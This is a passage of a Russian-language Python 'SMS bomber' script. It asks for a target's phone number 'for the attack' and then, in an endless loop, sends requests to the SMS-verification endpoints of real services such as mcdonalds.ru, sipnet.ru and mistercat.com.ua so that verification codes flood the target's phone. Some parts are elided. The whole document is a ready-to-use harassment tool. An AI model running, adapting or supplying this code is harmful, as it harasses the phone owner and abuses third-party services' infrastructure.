...
| [--] Сервисов: 70                                  |
|                                                    |
| [--] Created by: - Slider(Жека)                    |
|____________________________________________________|
"""

print(banner)
_phone = input('Привет! Введи номер для атаки ([Код страны(без+)]xxxxxxxxx)-->> ')

if _phone[0] == '+':
	_phone = _phone[1:]

if _phone[0] == "0":
	print("Вы забыли код страны")
	_phone = input('Привет! Введи номер для атаки ([Код страны(без+)]xxxxxxxxx)-->> ')	
...
while True:
	...
	try:
		...
		print('[+] privetmir отправлено!')
	except:
		print('[-] Не отправлено!')

	try:
		requests.post("https://mistercat.com.ua/index.php", params={'option': 'com_ksenmart', 'view': 'profile', 'task': 'profile.sms_auth', 'tmpl': 'ksenmart'}, data={'phone': _phone, 'type': 'send'})
		print('[+] mistercat отправлено!')
	except:
		print('[-] Не отправлено!')

	try:
		requests.post("https://mcdonalds.ru/api/auth/code", json={'phone': '+' + _phone})
		print('[+] mcdonalds отправлено!')
	except:
		print('[-] Не отправлено!')
	...
	try:
		requests.post("https://register.sipnet.ru/cgi-bin/exchange.dll/RegisterHelper", params={"oper": 9, "callmode": 1, "phone": "+" + _phone})
	...
	try:
		...
		print('[+] sberfood отправлено!')
	except:
		print('[-] Не отправлено!')

	try:
		requests.post("https://app.redmondeda.ru/api/v1/app/sendverificationcode", data={"phone": _phone}, headers={"token": "."})
	...
	try:
		...
		print('[+] secure online отправлено!')
	except:
		print('[-] Не отправлено!')
